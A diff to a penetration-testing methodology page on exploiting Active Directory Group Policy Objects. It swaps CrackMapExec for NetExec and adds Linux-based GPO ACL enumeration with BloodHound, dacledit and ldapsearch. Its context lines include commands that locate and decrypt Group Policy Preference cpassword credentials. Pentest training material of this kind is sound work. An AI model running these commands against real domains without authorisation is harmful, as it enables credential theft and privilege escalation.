@@ -5,7 +5,7 @@ category: Methodology
 subcategory: Active Directory Attack
 order: 5
 tags: ["active-directory", "gpo", "group-policy", "privilege-escalation", "pentesting"]
-updated: 2026-04-11
+updated: 2026-04-21
 ---
 
 # Part 5: Exploiting GPOs
@@ -60,8 +60,27 @@ Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {
 ```
 
 ```bash
-# CrackMapExec
-crackmapexec smb dc01 -u user -p pass -M gpp_password
+# NetExec (nxc)
+nxc smb dc01 -u user -p pass -M gpp_password
+```
+
+### Linux-Friendly GPO Enumeration
+
+When you don't have PowerView, read the same ACLs from Kali:
+
+```bash
+# BloodHound collection picks up GPO control edges (GenericAll, WriteProperty, etc.)
+bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All
+
+# nxc BloodHound collection (same data, one command)
+nxc ldap DC_IP -u user -p pass --bloodhound -c All --dns-server DC_IP
+
+# Read a specific GPO's ACL with dacledit
+dacledit.py domain.local/user:pass -target-dn 'CN={GPO-GUID},CN=Policies,CN=System,DC=domain,DC=local' -action read -dc-ip DC_IP
+
+# List GPOs and their gpcfilesyspath
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass \
+  -b "CN=Policies,CN=System,DC=domain,DC=local" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath
 ```
 
 ---
@@ -153,8 +172,8 @@ findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml
 # gpp-decrypt (Kali built-in)
 gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 
-# CrackMapExec module
-crackmapexec smb dc01 -u user -p pass -M gpp_password
+# NetExec module
+nxc smb dc01 -u user -p pass -M gpp_password
 
 # Metasploit
 use auxiliary/scanner/smb/smb_enum_gpp
